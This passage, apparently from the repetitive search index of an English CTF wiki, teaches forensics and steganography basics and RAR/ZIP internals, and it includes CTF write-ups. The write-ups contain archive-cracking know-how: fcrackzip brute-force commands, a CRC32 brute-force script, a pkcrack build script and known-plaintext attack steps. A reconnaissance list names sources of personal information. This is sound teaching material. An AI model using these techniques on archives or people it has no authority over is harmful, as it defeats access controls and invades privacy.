OJ [Jarvis OJ] ( https://www.jarvisoj.com/ ) CTF Learn Hackme CTF Practice CTF List","title":"CTF OJ"},{"location":"introduction/resources/#ctf-tools","text":"[Look at Snow Tools] ( https://tools.pediy.com/ ) [My Love Crack Tool] ( https://down.52pojie.cn/Tools/ ) [CTF online tool by CTFcode] ( http://ctf.ssleye.com/ ) [CTF online toolbox by bugku] ( http://tool.bugku.com/ ) [CTF Tools Resource Library by HBCTF team] ( https://ctftools.com/down/ ) ctf-tools by zardus The Cyber Swiss Army Knife","title":"CTF Tools"},{"location":"introduction/resources/#ctf-writeup","text":"[CTFs Writeup Collection] ( https://github.com/ctfs ) CTF solution by p4 team","title":"CTF Writeup"},{"location":"misc/introduction/","text":"Misc is an abbreviation for Miscellaneous The Misc category typically contains the following topics: Recon Forensics Stego Misc \u2026\u2026 The Misc category can sometimes include crypto (especially classic ciphers). In this section on Misc, we will go over the following topics: Recon (Information Gathering) Introduces ways to obtaining information and some tips on using search engines such as Google. Encodings (Encoding Conversion) Introduces some common encoding formats and conversion methods. Forensic && Stego Steganography and Forensics involve clever encoding, hidden data, nested files, using search engines to obtain information, and so on. Topics covered are file analysis, memory image analysis, network traffic analysis, and etc. Forensics is different in the real world. In the real world, it rarely involves clever encoding, hidden data, strings scattered and nested in files. But rather it involves mostly recovering data from a damaged file, finding evidence in a broken disk image, or extracting useful information from a memory/disk image. Real-world forensics requires you to find evidence of a malicious act: an attacker attacking the system or insider threat behavior by analyzing logs, memory, file system to find out the relationship between the files or data. Misc is the perfect entry point for CTF competition since it can help you discover and develop different interests. Misc requires various understanding and skills in security and creative thinking.","title":"Miscellaneous Introduction"},{"location":"misc/prereq/","text":"In most CTF competitions, both forensics and steganography are inseparable. The knowledge required for the two is also complementary, so both will be introduced here. Any requirement that requires finding hidden information in a static file is considered a forensics steganography question (unless it\u2019s purely cryptography). Some low-point questions do combine forensics steganography and classic ciphers. The high score questions, however, are usually combined with some more complex modern cryptography. This well reflects the characteristics of Misc questions. Basic Required Skills \u00b6 Familiar with common encodings. Able to decode encoded text found in files. Can identify some special encodings (base64, hexadecimal, binary, etc.) and convert them to obtain the flags. Ability to manipulate binary data using scripting languages (Python, etc.) Familiar with file formats of common files, especially the various file headers , protocols, structures, etc Can effectively use common tools Manipulate Binary Data in Python \u00b6 struct Module \u00b6 Sometimes you need to use Python to process binary data, such as, when saving a file or using a socket. Python\u2019s struct module can help you complete those tasks. The three most important functions in the struct module are pack() , unpack() , and calcsize() pack(fmt, v1, v2, ...) Packs a list of values into a string according to the given format fmt (similar to a C structure's byte stream) unpack(fmt, string) Unpacks the packed value into its original representation according to the given format fmt and returns the unpacked tuple calcsize(fmt) Calculates and returns the size of the String representation of struct according to the given format fmt The packing format fmt here determines how the variable is packaged as a byte stream, which contains a series of format strings. For details the meanings of the different formatted strings, please refer to Python Doc for more details. >>> import struct >>> struct . pack ( '>I' , 16 ) b ' \\x00\\x00\\x00\\x10 ' The first argument of pack is the packing instruction. '>I' means: > indicates that the byte order is Big-Endian, which is the network byte order. I indicates a 4-byte unsigned integer. The number of arguments must match the number of format characters used in the packing instruction. In this case, because only one format characters are used( I ), there can only be one remaining argument. To read the first 30 bytes of a BMP file, the structure of the file header is as follows: - Two bytes: BM for Windows bitmap, BA for OS/2 bitmap - a 4-byte integer: size of the BMP file in bytes - a 4-byte integer: reserved bits, always 0 - a 4-byte integer: offset of the byte where the bitmap image data (pixel array) can be found - a 4-byte integer: size of this header - a 4-byte integer: bitmap width in pixels - a 4-byte integer: bitmap height in pixels - a 2-byte integer: number of color planes (always 1) - a 2 byte integer: number of bits per pixel, which is the color depth of the image (Typically 1, 4, 8, 16, 24, 32) For more details, see BMP file format - Wikipedia >>> import struct >>> bmp = b ' \\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00 ' >>> struct . unpack ( '<ccIIIIIIHH' , bmp ) ( b 'B' , b 'M' , 691256 , 0 , 54 , 40 , 640 , 360 , 1 , 24 ) bytearray \u00b6 Read a file into a bytearray data = bytearray ( open ( 'challenge.png' , 'rb' ) . read ()) A bytearray is a mutable version of bytes data [ 0 ] = ' \\x89 ' Common Tools \u00b6 010 Editor \u00b6 Sweetscape 010 Editor is a new hex file Editor that differs from traditional hex editors in that it uses \"templates\" to parse binary files so you can read and edit them. It can also be used to compare any other binary file. Its templating feature makes it very easy to observe the internal structure of a file and quickly change the content accordingly. file Command \u00b6 The file command identifies the file type of a file based on the file header (magic bytes). root@linux:~/Desktop/tmp# file flag flag: PNG image data, 450 x 450 , 8 -bit grayscale, non-interlaced strings Command \u00b6 Print or display the printable characters of a file. Often you can discover hints or encoded information in the printable characters. You can extract specific information with the grep command strings test | grep -i XXCTF You can get all ASCII character offsets with the -o option root@linux:~/Desktop/tmp# strings -o flag | head 14 IHDR 45 gAMA 64 cHRM 141 bKGD 157 tIME 202 IDATx 223 NFdVK3 361 |; *- 410 Ge%<W 431 5duX@% binwalk Command \u00b6 binwalk is a firmware analysis tool. In CTFs, binwalk is often used to discover multiple files hidden in a file. Furthermore, the tool uses the file header (magic bytes) to find other files contained in a file. Sometimes, there are false positives (especially for a PCAP, packet capture, file). root@linux:~/Desktop/tmp# binwalk flag DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 450 x 450 , 8 -bit grayscale, non-interlaced 134 0x86 Zlib compressed data, best compression 25683 0x6453 Zip archive data, at least v2.0 to extract, compressed size: 675 , uncompressed size: 1159 , name: readme.txt 26398 0x671E Zip archive data, at least v2.0 to extract, compressed size: 430849 , uncompressed size: 1027984 , name: trid 457387 0x6FAAB End of Zip archive Automatic extraction with the -e option: binwalk -e flag Manual file carving can also be done with the dd command: root@linux:~/Desktop/tmp# dd if = flag of = 1 .zip bs = 1 skip = 25683 431726 +0 records in 431726 +0 records out 431726 bytes ( 432 kB, 422 KiB ) copied, 0 .900973 s, 479 kB/s","title":"Forensic and Steganography Prerequisite"},{"location":"misc/prereq/#basic-required-skills","text":"Familiar with common encodings. Able to decode encoded text found in files. Can identify some special encodings (base64, hexadecimal, binary, etc.) and convert them to obtain the flags. Ability to manipulate binary data using scripting languages (Python, etc.) Familiar with file formats of common files, especially the various file headers , protocols, structures, etc Can effectively use common tools","title":"Basic Required Skills"},{"location":"misc/prereq/#manipulate-binary-data-in-python","text":"","title":"Manipulate Binary Data in Python"},{"location":"misc/prereq/#struct-module","text":"Sometimes you need to use Python to process binary data, such as, when saving a file or using a socket. Python\u2019s struct module can help you complete those tasks. The three most important functions in the struct module are pack() , unpack() , and calcsize() pack(fmt, v1, v2, ...) Packs a list of values into a string according to the given format fmt (similar to a C structure's byte stream) unpack(fmt, string) Unpacks the packed value into its original representation according to the given format fmt and returns the unpacked tuple calcsize(fmt) Calculates and returns the size of the String representation of struct according to the given format fmt The packing format fmt here determines how the variable is packaged as a byte stream, which contains a series of format strings. For details the meanings of the different formatted strings, please refer to Python Doc for more details. >>> import struct >>> struct . pack ( '>I' , 16 ) b ' \\x00\\x00\\x00\\x10 ' The first argument of pack is the packing instruction. '>I' means: > indicates that the byte order is Big-Endian, which is the network byte order. I indicates a 4-byte unsigned integer. The number of arguments must match the number of format characters used in the packing instruction. In this case, because only one format characters are used( I ), there can only be one remaining argument. To read the first 30 bytes of a BMP file, the structure of the file header is as follows: - Two bytes: BM for Windows bitmap, BA for OS/2 bitmap - a 4-byte integer: size of the BMP file in bytes - a 4-byte integer: reserved bits, always 0 - a 4-byte integer: offset of the byte where the bitmap image data (pixel array) can be found - a 4-byte integer: size of this header - a 4-byte integer: bitmap width in pixels - a 4-byte integer: bitmap height in pixels - a 2-byte integer: number of color planes (always 1) - a 2 byte integer: number of bits per pixel, which is the color depth of the image (Typically 1, 4, 8, 16, 24, 32) For more details, see BMP file format - Wikipedia >>> import struct >>> bmp = b ' \\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00 ' >>> struct . unpack ( '<ccIIIIIIHH' , bmp ) ( b 'B' , b 'M' , 691256 , 0 , 54 , 40 , 640 , 360 , 1 , 24 )","title":"struct Module"},{"location":"misc/prereq/#bytearray","text":"Read a file into a bytearray data = bytearray ( open ( 'challenge.png' , 'rb' ) . read ()) A bytearray is a mutable version of bytes data [ 0 ] = ' \\x89 '","title":"bytearray"},{"location":"misc/prereq/#common-tools","text":"","title":"Common Tools"},{"location":"misc/prereq/#010-editor","text":"Sweetscape 010 Editor is a new hex file Editor that differs from traditional hex editors in that it uses \"templates\" to parse binary files so you can read and edit them. It can also be used to compare any other binary file. Its templating feature makes it very easy to observe the internal structure of a file and quickly change the content accordingly.","title":"010 Editor"},{"location":"misc/prereq/#file-command","text":"The file command identifies the file type of a file based on the file header (magic bytes). root@linux:~/Desktop/tmp# file flag flag: PNG image data, 450 x 450 , 8 -bit grayscale, non-interlaced","title":"file Command"},{"location":"misc/prereq/#strings-command","text":"Print or display the printable characters of a file. Often you can discover hints or encoded information in the printable characters. You can extract specific information with the grep command strings test | grep -i XXCTF You can get all ASCII character offsets with the -o option root@linux:~/Desktop/tmp# strings -o flag | head 14 IHDR 45 gAMA 64 cHRM 141 bKGD 157 tIME 202 IDATx 223 NFdVK3 361 |; *- 410 Ge%<W 431 5duX@%","title":"strings Command"},{"location":"misc/prereq/#binwalk-command","text":"binwalk is a firmware analysis tool. In CTFs, binwalk is often used to discover multiple files hidden in a file. Furthermore, the tool uses the file header (magic bytes) to find other files contained in a file. Sometimes, there are false positives (especially for a PCAP, packet capture, file). root@linux:~/Desktop/tmp# binwalk flag DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 450 x 450 , 8 -bit grayscale, non-interlaced 134 0x86 Zlib compressed data, best compression 25683 0x6453 Zip archive data, at least v2.0 to extract, compressed size: 675 , uncompressed size: 1159 , name: readme.txt 26398 0x671E Zip archive data, at least v2.0 to extract, compressed size: 430849 , uncompressed size: 1027984 , name: trid 457387 0x6FAAB End of Zip archive Automatic extraction with the -e option: binwalk -e flag Manual file carving can also be done with the dd command: root@linux:~/Desktop/tmp# dd if = flag of = 1 .zip bs = 1 skip = 25683 431726 +0 records in 431726 +0 records out 431726 bytes ( 432 kB, 422 KiB ) copied, 0 .900973 s, 479 kB/s","title":"binwalk Command"},{"location":"misc/recon/","text":"Network Information Gathering \u00b6 Public information Target's website, location, and related organizations Organizational structure and personnel, personal information, telephone, email Network configuration and security policy Find security vulnerabilities or private information using a search engine Google Hacking Database Basic Search \u00b6 Basic Google search techniques Clear and simple keywords Describe what you are looking for in a concise and simple manner Unique description words Public information database Personal information from Census Bureau Enterprises and other entities: YellowPage, Enterprise Credit Information Network Website, domain name, IP address: whois Maps and Street View Search \u00b6 Google Map, Google Earth, Google Street View IP Address Lookup \u00b6 whois database GeoIP IP2Location","title":"Information Gathering Method"},{"location":"misc/recon/#network-information-gathering","text":"Public information Target's website, location, and related organizations Organizational structure and personnel, personal information, telephone, email Network configuration and security policy Find security vulnerabilities or private information using a search engine Google Hacking Database","title":"Network Information Gathering"},{"location":"misc/recon/#basic-search","text":"Basic Google search techniques Clear and simple keywords Describe what you are looking for in a concise and simple manner Unique description words Public information database Personal information from Census Bureau Enterprises and other entities: YellowPage, Enterprise Credit Information Network Website, domain name, IP address: whois","title":"Basic Search"},{"location":"misc/recon/#maps-and-street-view-search","text":"Google Map, Google Earth, Google Street View","title":"Maps and Street View Search"},{"location":"misc/recon/#ip-address-lookup","text":"whois database GeoIP IP2Location","title":"IP Address Lookup"},{"location":"misc/archive/rar/","text":"File Structure \u00b6 A RAR file mainly consists of tag block, file header block, file header block, and end block. Each block is roughly divided into the following fields: Name Size Description HEAD_CRC 2 CRC of total block or block part HEAD_TYPE 1 Block Type HEAD_FLAGS 2 Block Flags HEAD_SIZE 2 Block Size ADD_SIZE 4 Optional Field - added block size The file header of the RAR archive is 0x 52 61 72 21 1A 07 00 . Following the file header ( 0x526172211A0700 ) the MARK_HEAD. File Header (File in Archive): Name Size Description HEAD_CRC 2 CRC of fields from HEAD_TYPE to FILEATTR and file name HEAD_TYPE 1 Header Type: 0x74 HEAD_FLAGS 2 Bit Flags (Please see 'Bit Flags for File in Archive' table for all possibilities) HEAD_SIZE 2 File header full size including file name and comments PACK_SIZE 4 Compressed file size UNP_SIZE 4 Uncompressed file size HOST_OS 1 Operating system used for archiving (See the 'Operating System Indicators' table for the flags used) FILE_CRC 4 File CRC FTIME 4 Date and time in standard MS DOS format UNP_VER 1 RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.) METHOD 1 Packing method (Please see 'Packing Method' table for all possibilities NAME_SIZE 2 File name size ATTR 4 File attributes HIGH_PACK_SIZ 4 High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. HIGH_UNP_SIZE 4 High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. FILE_NAME NAME_SIZE bytes File name - string of NAME_SIZE bytes size SALT 8 present if (HEAD_FLAGS & 0x400) != 0 EXT_TIME variable size present if (HEAD_FLAGS & 0x1000) != 0 The end of each RAR file is fixed (Terminator): Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 The RAR terminator or trailer bytes is thus always 0x C4 3D 7B 00 40 07 00 See more details here Attack Methods \u00b6 Brute Force \u00b6 RarCrack Pseudo encryption \u00b6 The pseudo-encryption of a RAR file is on the bit mark field in the header of the file. This bit is clearly visible with the 010 Editor. Modifying this bit can create pseudo-encryption. Other techniques, such as plaintext attacks, remain the same as described in ZIP.","title":"RAR Format"},{"location":"misc/archive/rar/#file-structure","text":"A RAR file mainly consists of tag block, file header block, file header block, and end block. Each block is roughly divided into the following fields: Name Size Description HEAD_CRC 2 CRC of total block or block part HEAD_TYPE 1 Block Type HEAD_FLAGS 2 Block Flags HEAD_SIZE 2 Block Size ADD_SIZE 4 Optional Field - added block size The file header of the RAR archive is 0x 52 61 72 21 1A 07 00 . Following the file header ( 0x526172211A0700 ) the MARK_HEAD. File Header (File in Archive): Name Size Description HEAD_CRC 2 CRC of fields from HEAD_TYPE to FILEATTR and file name HEAD_TYPE 1 Header Type: 0x74 HEAD_FLAGS 2 Bit Flags (Please see 'Bit Flags for File in Archive' table for all possibilities) HEAD_SIZE 2 File header full size including file name and comments PACK_SIZE 4 Compressed file size UNP_SIZE 4 Uncompressed file size HOST_OS 1 Operating system used for archiving (See the 'Operating System Indicators' table for the flags used) FILE_CRC 4 File CRC FTIME 4 Date and time in standard MS DOS format UNP_VER 1 RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.) METHOD 1 Packing method (Please see 'Packing Method' table for all possibilities NAME_SIZE 2 File name size ATTR 4 File attributes HIGH_PACK_SIZ 4 High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. HIGH_UNP_SIZE 4 High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. FILE_NAME NAME_SIZE bytes File name - string of NAME_SIZE bytes size SALT 8 present if (HEAD_FLAGS & 0x400) != 0 EXT_TIME variable size present if (HEAD_FLAGS & 0x1000) != 0 The end of each RAR file is fixed (Terminator): Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 The RAR terminator or trailer bytes is thus always 0x C4 3D 7B 00 40 07 00 See more details here","title":"File Structure"},{"location":"misc/archive/rar/#attack-methods","text":"","title":"Attack Methods"},{"location":"misc/archive/rar/#brute-force","text":"RarCrack","title":"Brute Force"},{"location":"misc/archive/rar/#pseudo-encryption","text":"The pseudo-encryption of a RAR file is on the bit mark field in the header of the file. This bit is clearly visible with the 010 Editor. Modifying this bit can create pseudo-encryption. Other techniques, such as plaintext attacks, remain the same as described in ZIP.","title":"Pseudo encryption"},{"location":"misc/archive/zip/","text":"File Structure \u00b6 The ZIP file is mainly composed of three parts, respectively local file header + file data + data descriptor central directory end of central directory record Each compressed source file or directory in the compressed source file data area is a record: local file header : file header is used to identify the beginning of the file. The file header identifier starts with a fixed value of 50 4B 03 04 file data : file data records the data of the corresponding compressed file data descriptor : data descriptor is used to identify the end of the file compression. This structure appears only when the 3 rd bit of the generic tag field in the corresponding local file header is set to 1 immediately after the compressed file source data Central directory central directory is used to record directory information. Each record in this data area corresponds to one data area in the compressed source file Offset Bytes Description 0 4 Central directory file header signature = 0x02014b50 4 2 Version made by 6 2 Version needed to extract (minimum) 8 2 General purpose bit flag 10 2 Compression method 12 2 File last modification time 14 2 File last modification date 16 4 CRC-32 20 4 Compressed size 24 4 Uncompressed size 28 2 File name length (n) 30 2 Extra field length (m) 32 2 File comment length (k) 34 2 Disk number where file starts 36 2 Internal file attributes 38 4 External file attributes 42 4 relative offset of local header 46 n File name 46+n m Extra field 46+n+m k File comment End of central directory record(EOCD) end of directory identifier, exists at the end of the entire archive package and is used to mark the end of compressed catalog data. Each compressed file must have one and only one EOCD record See Official Documentation for more details. Attack Methods \u00b6 Brute Force \u00b6 Here are two tools for brute-forcing zip . Windows (Paid) - ARCHPR Linux (Free) - fcrackzip Example command: root@kali: fcrackzip -b -c1 -u test.zip -b for brute force mode, -c1 specifies password character set to be numbers, -u validates the password with unzip , -l 5-6 specifies password length CRC32 \u00b6 Basics \u00b6 CRC stands for cyclic redundancy check, and CRC32 means that a check value of 32 bit is generated. Since every bit of a CRC32 value is used in the calculation, when one-bit changes in the data block, a different CRC32 value will be generated. The CRC32 checksum appears in many files such as a png file, as well as the CRC32 checksum in zip . It is worth noting that CRC32 in zip is the checksum value of the unencrypted files. This has led to an attack method based on CRC32 . There is very little content in the file (it is about 4 bytes, in most CTFs) Encrypted password is very long Instead of brute-forcing the password of zip file , we can brute force the contents of the plaintext file (usually strings) to obtain what we want. For example, we created a new flag.txt with the content 123 and encrypt it with the password !QAZXSW@#EDCVFR$ . Then, we calculated the CRC32 value of the file within the encrypted zip and found that it matches the CRC32 value in the above figure. File: flag.txt Size: 3 Time: Tue, 29 Aug 2017 10 :38:10 +0800 MD5: 202cb962ac59075b964b07152d234b70 SHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef CRC32: 884863D2 Note When brute forcing, we could try to get all possible strings' CRC32 value and compare it with the CRC32 value of file within the compressed zip file. Here is a CRC32 brute force script: Note Run this script in Python2 import binascii import base64 import string import itertools import struct alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=' crcdict = {} print \"computing all possible CRCs...\" for x in itertools . product ( list ( alph ), repeat = 4 ): st = '' . join ( x ) testcrc = binascii . crc32 ( st ) crcdict [ struct . pack ( '<i' , testcrc )] = st print \"Done!\" f = open ( 'flag.zip' ) data = f . read () f . close () crc = '' . join ( data [ 14 : 18 ]) if crc in crcdict : print crcdict [ crc ] else : print \"FAILED!\" CTF Example \u00b6 Abctf-2016 - Zippy \u00b6 Download the challenge file here Based on the file size of each compressed file, it can be inferred that the CRC32 attack method can be used. You can brute force the CRC32 value for all the compressed files. After that you concatenate the contents from each compressed file to get a base64 string, decode that will get you the flag. You can use this script to brute force CRC32 values and obtain the content of each compressed file: Note Run this script in Python2 # unzip to file ./zippy directory import binascii import base64 import string import itertools import struct alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=' crcdict = {} print \"computing all possible CRCs...\" for x in itertools . product ( list ( alph ), repeat = 4 ): st = '' . join ( x ) testcrc = binascii . crc32 ( st ) crcdict [ struct . pack ( '<i' , testcrc )] = st print \"Done!\" for i in range ( 54 ): f = open ( \"./zippy/chunk {} .zip\" . format ( i )) data = f . read () f . close () crc = '' . join ( data [ 14 : 18 ]) if crc in crcdict : print crcdict [ crc ] else : print \"FAILED!\" We got the following base64 string: UEsDBBQDAQAAAJFy1kgWujyNLwAAACMAAAAIAAAAZmxhZy50eHT/xhoeSnjMRLuArw2FXUAIWn8UQblChs4AF1dAnT4nB5hs2SkR4fTfZZRB56Bp/FBLAQI/AxQDAQAAAJFy1kgWujyNLwAAACMAAAAIAAAAAAAAAAAAIIC0gQAAAABmbGFnLnR4dFBLBQYAAAAAAQABADYAAABVAAAAAAA= The base64 string decodes to another zipfile, which is password protected. Let's brute force the password with fcrackzip : fcrackzip -b -c 'Aa1' -l 1-5 -v -u flag.zip - -b, brute force mode - -c 'Aa1', character set lowercase and uppercase letters, numbers - -l 1-5, password length 1-5 - -u double check password to avoid false positives We got the password: z1P Flag: flag{i_z1pp3d_a_zip_w1th_sum_zips} Clear text attack \u00b6 Basics \u00b6 An encrypted compressed file A software to compress files, such as, 7z or zip , to view compressed file details. In Linux, you can use zipinfo -v to view the details, such as encryption algorithms, etc Know at least 12 bytes of contiguous content of a file of the archive If you already know part of the encrypted file, such as the readme.txt file found on a website, you can start trying to crack it. First, compress this plaintext file into a zip file. For example, readme.txt into readme.zip . Then, you need to confirm that the compression algorithm used by both is the same. A simple way to check is to open the file and see file is compressed with the same volume. If they are the same, it means the compression algorithm you are using is correct. If it is different, try another compression algorithm. CTF Example \u00b6 2015 Guangzhou Strong Net Cup - burst \u00b6 Download the challenge file here First of all, the name of the challenge is burst . It is obvious we need to a cracking tool. First step, analyze the compressed file We see the file name is .zip . We extract the zip file and found there are two files, Desktop.zip and readme.txt respectively. Let's see the contents of readme.txt : After opening it, it shows qianwanbuyaogeixuanshoukandao!!! . In the Desktop.zip , there is a readme.txt , a answer folder with a key.txt file. The flag is probably in the key.txt file. Step 2, analyze the crack method We found that the extracted file and the Desktop.zip contain the same readme.txt file, where it's size is greater than 12 bytes . The CRC32 value of extracted readme.txt file is the same as the one in Desktop.zip . Base on that information, we can safely guess the extracted readme.txt file is the plaintext of encrypted readme.txt in Desktop.zip . Step 3, try plaintext attack Now that we know that it is a plaintext attack, we will crack the encrypted compressed file. Since the extracted readme.txt is the plaintext of readme.txt in the encrypted archive, compress readme.txt to a .zip file. We are going to use pkcrack , to install it save the following script to pkcrack-install.sh and run it to the current directory, giving it an execute permission. #!/bin/bash -ex wget https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gz tar xzf pkcrack-1.2.2.tar.gz cd pkcrack-1.2.2/src make mkdir -p ../../bin cp extract findkey makekey pkcrack zipdecrypt ../../bin cd ../../ Then a folder of bin will be generated in the current directory. We will directly enter the bin folder and see the pkcrack file, which be used for cracking. ./pkcrack -c readme.txt -p readme.txt -C ~/download/misc/Desktop.zip -P ~/download/misc/readme.zip -d ~/decrypt.zip The parameter options we used are as follows: -C: target file to be cracked or encrypted file -c: name of ciphertext file within the encrypted file (readme.txt in Desktop.zip) -P: compressed plaintext file -p: name of the plaintext file in the compressed plaintext file (that is, the location of readme.txt in readme.zip) -d: name of the output decrypted zip file For other options see ./pkcrack --help The results after decryption are as follows: We can see that we started running at 1:10 in the afternoon and solved the secret key in the afternoon at 3:27 . So, the cracking can take a bit. flag: flag{7ip_Fi13_S0m3tim3s_s0_3a5y@} Pseudo encryption \u00b6 Basics \u00b6 In the central directory in the ZIP format above, we emphasize there is 2 byte for the general-purpose bit flag. different bits have different meanings. Bit 0: If set, indicates that the file is encrypted. (For Method 6 - Imploding) Bit 1: If the compression method used was type 6, Imploding, then this bit, if set, indicates an 8K sliding dictionary was used. If clear, then a 4K sliding dictionary was used. ... Bit 6: Strong encryption. If this bit is set, you should set the version needed to extract value to at least 50 and you must also set bit 0. If AES encryption is used, the version needed to extract value must be at least 51. ... In 010Editor we tried to modify this general purpose bit from 0 --> 1 . Open the file again, it now requires a password. Modify pseudo-encryption method: Modify the general purpose bit in hex binwalk -e ignores pseudo encryption In the Mac OS and some Linux (such as Kali ), you can open the pseudo-encrypted ZIP Detect pseudo-encrypted with ZipCenOp.jar tool Sometimes you can use WinRar 's repair feature References \u00b6 https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html http://bobao.360.cn/ctf/detail/197.html","title":"ZIP Format"},{"location":"misc/archive/zip/#file-structure","text":"The ZIP file is mainly composed of three parts, respectively local file header + file data + data descriptor central directory end of central directory record Each compressed source file or directory in the compressed source file data area is a record: local file header : file header is used to identify the beginning of the file. The file header identifier starts with a fixed value of 50 4B 03 04 file data : file data records the data of the corresponding compressed file data descriptor : data descriptor is used to identify the end of the file compression. This structure appears only when the 3 rd bit of the generic tag field in the corresponding local file header is set to 1 immediately after the compressed file source data Central directory central directory is used to record directory information. Each record in this data area corresponds to one data area in the compressed source file Offset Bytes Description 0 4 Central directory file header signature = 0x02014b50 4 2 Version made by 6 2 Version needed to extract (minimum) 8 2 General purpose bit flag 10 2 Compression method 12 2 File last modification time 14 2 File last modification date 16 4 CRC-32 20 4 Compressed size 24 4 Uncompressed size 28 2 File name length (n) 30 2 Extra field length (m) 32 2 File comment length (k) 34 2 Disk number where file starts 36 2 Internal file attributes 38 4 External file attributes 42 4 relative offset of local header 46 n File name 46+n m Extra field 46+n+m k File comment End of central directory record(EOCD) end of directory identifier, exists at the end of the entire archive package and is used to mark the end of compressed catalog data. Each compressed file must have one and only one EOCD record See Official Documentation for more details.","title":"File Structure"},{"location":"misc/archive/zip/#attack-methods","text":"","title":"Attack Methods"},{"location":"misc/archive/zip/#brute-force","text":"Here are two tools for brute-forcing zip . Windows (Paid) - ARCHPR Linux (Free) - fcrackzip Example command: root@kali: fcrackzip -b -c1 -u test.zip -b for brute force mode, -c1 specifies password character set to be numbers, -u validates the password with unzip , -l 5-6 specifies password length","title":"Brute Force"},{"location":"misc/archive/zip/#crc32","text":"","title":"CRC32"},{"location":"misc/archive/zip/#basics","text":"CRC stands for cyclic redundancy check, and CRC32 means that a check value of 32 bit is generated. Since every bit of a CRC32 value is used in the calculation, when one-bit changes in the data block, a different CRC32 value will be generated. The CRC32 checksum appears in many files such as a png file, as well as the CRC32 checksum in zip . It is worth noting that CRC32 in zip is the checksum value of the unencrypted files. This has led to an attack method based on CRC32 . There is very little content in the file (it is about 4 bytes, in most CTFs) Encrypted password is very long Instead of brute-forcing the password of zip file , we can brute force the contents of the plaintext file (usually strings) to obtain what we want. For example, we created a new flag.txt with the content 123 and encrypt it with the password !QAZXSW@#EDCVFR$ . Then, we calculated the CRC32 value of the file within the encrypted zip and found that it matches the CRC32 value in the above figure. File: flag.txt Size: 3 Time: Tue, 29 Aug 2017 10 :38:10 +0800 MD5: 202cb962ac59075b964b07152d234b70 SHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef CRC32: 884863D2 Note When brute forcing, we could try to get all possible strings' CRC32 value and compare it with the CRC32 value of file within the compressed zip file. Here is a CRC32 brute force script: Note Run this script in Python2 import binascii import base64 import string import itertools import struct alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=' crcdict = {} print \"computing all possible CRCs...\" for x in itertools . product ( list ( alph ), repeat = 4 ): st = '' . join ( x ) testcrc = binascii . crc32 ( st ) crcdict [ struct . pack ( '<i' , testcrc )] = st print \"Done!\" f = open ( 'flag.zip' ) data = f . read () f . close () crc = '' . join ( data [ 14 : 18 ]) if crc in crcdict : print crcdict [ crc ] else : print \"FAILED!\"","title":"Basics"},{"location":"misc/archive/zip/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/archive/zip/#abctf-2016-zippy","text":"Download the challenge file here Based on the file size of each compressed file, it can be inferred that the CRC32 attack method can be used. You can brute force the CRC32 value for all the compressed files. After that you concatenate the contents from each compressed file to get a base64 string, decode that will get you the flag. You can use this script to brute force CRC32 values and obtain the content of each compressed file: Note Run this script in Python2 # unzip to file ./zippy directory import binascii import base64 import string import itertools import struct alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=' crcdict = {} print \"computing all possible CRCs...\" for x in itertools . product ( list ( alph ), repeat = 4 ): st = '' . join ( x ) testcrc = binascii . crc32 ( st ) crcdict [ struct . pack ( '<i' , testcrc )] = st print \"Done!\" for i in range ( 54 ): f = open ( \"./zippy/chunk {} .zip\" . format ( i )) data = f . read () f . close () crc = '' . join ( data [ 14 : 18 ]) if crc in crcdict : print crcdict [ crc ] else : print \"FAILED!\" We got the following base64 string: UEsDBBQDAQAAAJFy1kgWujyNLwAAACMAAAAIAAAAZmxhZy50eHT/xhoeSnjMRLuArw2FXUAIWn8UQblChs4AF1dAnT4nB5hs2SkR4fTfZZRB56Bp/FBLAQI/AxQDAQAAAJFy1kgWujyNLwAAACMAAAAIAAAAAAAAAAAAIIC0gQAAAABmbGFnLnR4dFBLBQYAAAAAAQABADYAAABVAAAAAAA= The base64 string decodes to another zipfile, which is password protected. Let's brute force the password with fcrackzip : fcrackzip -b -c 'Aa1' -l 1-5 -v -u flag.zip - -b, brute force mode - -c 'Aa1', character set lowercase and uppercase letters, numbers - -l 1-5, password length 1-5 - -u double check password to avoid false positives We got the password: z1P Flag: flag{i_z1pp3d_a_zip_w1th_sum_zips}","title":"Abctf-2016 - 